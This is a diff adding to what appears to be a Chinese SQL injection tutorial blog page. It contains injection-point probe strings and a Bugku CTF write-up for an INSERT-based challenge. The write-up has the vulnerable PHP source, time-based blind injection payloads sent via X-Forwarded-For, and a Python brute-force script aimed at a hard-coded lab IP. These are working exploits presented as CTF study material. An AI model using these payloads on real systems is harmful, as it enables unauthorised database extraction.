@@ -109,6 +109,38 @@
 
 <h2 id="0x01-判断注入点">0x01 判断注入点</h2>
 
+<p>如果产生预期结果，那么就表示存在注入点</p>
+
+<h3 id="1字符型注入的判断">1.字符型注入的判断</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>构造测试                        预期结果                         变种
+a'                      //触发错误，返回数据库错误                              
+a' or '1'='1            //永真条件，返回所有记录               a') or ('1'=1   
+a' or '1'='2            //空条件，返回原来相同结果             a') or ('1'=2
+a' and '1'='2           //永假条件，不返回记录                 a') and ('1'='2
+</code></pre></div></div>
+
+<h3 id="2数字型注入的判断">2.数字型注入的判断</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>构造测试                        预期结果                         变种
+'                       //触发错误，返回数据库错误                  
+1+1                     //返回原来相同的结果                    3-1
+1+0                     //返回原来相同的结果                     
+1 or 1=1                //永真条件，返回所有记录                 1) or (1=1
+1 or 1=2                //空条件，返回原来相同的结果              1) or (1=2
+1 and 1=2               //永假条件，不返回记录                   1) and (1=2
+</code></pre></div></div>
+
+<h3 id="3服务端错误返回形式">3.服务端错误返回形式</h3>
+
+<ul>
+  <li>错误直接回显在页面上</li>
+  <li>错误隐藏在页面源代码中</li>
+  <li>检测到错误跳转到另一个页面</li>
+  <li>返回HTTP错误代码500或重定向302</li>
+  <li>适当处理错误结果，常显示一个通用错误页面</li>
+</ul>
+
 <p><br /></p>
 
 <h2 id="0x02-sql-注入的步骤">0x02 SQL 注入的步骤</h2>
@@ -146,6 +178,96 @@
 <h2 id="0x03-例子">0x03 例子</h2>
 
 <p>1.<a href="http://ctf.bugku.com/challenges">INSERT INTO注入</a></p>
+
+<p>这道题给出的后台源码是这样的：</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+
+<span class="k">function</span> <span class="nf">getIp</span><span class="p">(){</span>
+<span class="nv">$ip</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_X_FORWARDED_FOR'</span><span class="p">])){</span>
+<span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_X_FORWARDED_FOR'</span><span class="p">];</span>
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+<span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">];</span>
+<span class="p">}</span>
+<span class="nv">$ip_arr</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">','</span><span class="p">,</span> <span class="nv">$ip</span><span class="p">);</span>
+<span class="k">return</span> <span class="nv">$ip_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+
+<span class="p">}</span>
+
+<span class="nv">$host</span><span class="o">=</span><span class="s2">"localhost"</span><span class="p">;</span>
+<span class="nv">$user</span><span class="o">=</span><span class="s2">""</span><span class="p">;</span>
+<span class="nv">$pass</span><span class="o">=</span><span class="s2">""</span><span class="p">;</span>
+<span class="nv">$db</span><span class="o">=</span><span class="s2">""</span><span class="p">;</span>
+
+<span class="nv">$connect</span> <span class="o">=</span> <span class="nb">mysql_connect</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span> <span class="nv">$user</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">"Unable to connect"</span><span class="p">);</span>
+
+<span class="nb">mysql_select_db</span><span class="p">(</span><span class="nv">$db</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">"Unable to select database"</span><span class="p">);</span>
+
+<span class="nv">$ip</span> <span class="o">=</span> <span class="nx">getIp</span><span class="p">();</span>
+<span class="k">echo</span> <span class="s1">'your ip is :'</span><span class="o">.</span><span class="nv">$ip</span><span class="p">;</span>
+<span class="nv">$sql</span><span class="o">=</span><span class="s2">"insert into client_ip (ip) values ('</span><span class="nv">$ip</span><span class="s2">')"</span><span class="p">;</span>
+<span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>从以上代码可以看出，这里过滤了 IP 里的逗号，也就意味着不能使用 <code class="highlighter-rouge">substr(X,1,1)</code>之类含有逗号的一些函数。<strong>无论在 XFF 后添加什么东西，都会返回原来的东西，所以应该是 Insert 型的 SQL 注入，考虑时间盲注。</strong>首先给出这题的 <strong>tips</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select case when 条件 then 执行1 else 执行2
+
+substr(X,1,1) --&gt; substr() from 1 for 1
+</code></pre></div></div>
+
+<p><strong>payload:</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>11'+(select case when substr((select flag from flag) from 1 for 1)='a' then sleep(5) else 0 end))%23
+</code></pre></div></div>
+
+<h3 id="step1暴出数据库名">Step1.暴出数据库名</h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#encoding: utf-8</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">string</span>
+
+<span class="n">mystring</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">punctuation</span>
+<span class="n">url</span><span class="o">=</span><span class="s">'http://120.24.86.145:8002/web15/'</span>
+<span class="n">data</span> <span class="o">=</span> <span class="s">"'+(select case when (substring((select database() ) from {0} for 1)='{1}') then sleep(5) else 1 end)) #"</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="s">''</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">mystring</span><span class="p">:</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">'x-forwarded-for'</span><span class="p">:</span><span class="n">data</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">),</span><span class="n">j</span><span class="p">)}</span>
+            <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span>
+        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">ReadTimeout</span><span class="p">:</span>
+            <span class="n">flag</span> <span class="o">+=</span> <span class="n">j</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+            <span class="k">break</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">'The database name is '</span><span class="o">+</span><span class="n">flag</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>原理是利用<code class="highlighter-rouge">11+false/true</code>去进行判断，如果是 true，就会 <code class="highlighter-rouge">sleep(5)</code>，从而执行 except 里面的代码。</p>
+
+<h3 id="step2查询表名">Step2.查询表名</h3>
+
+<p><strong>payload：</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>data = "'+(select case when (substring((select table_name from information_schema.tables where table_schema= 'web15' limit 1 offset {0}) from {1} for 1)='{2}') then sleep(5) else 1 end)) #"
+</code></pre></div></div>
+
+<h3 id="step3查询列名">Step3.查询列名</h3>
+
+<p><strong>payload:</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>data = "'+(select case when (substring((select column_name from information_schema.columns where table_name='flag' limit 1 offset {0}) from {1} for 1)='{2}') then sleep(5) else 1 end)) #"
+</code></pre></div></div>
+
+<h3 id="step4查询目标数据">Step4.查询目标数据</h3>
+
+<p><strong>payload:</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>data = "'+(select case when (substring((select flag from flag) from {0} for 1)='{1}') then sleep(5) else 1 end)) #"
+</code></pre></div></div>
 
 
     </article>
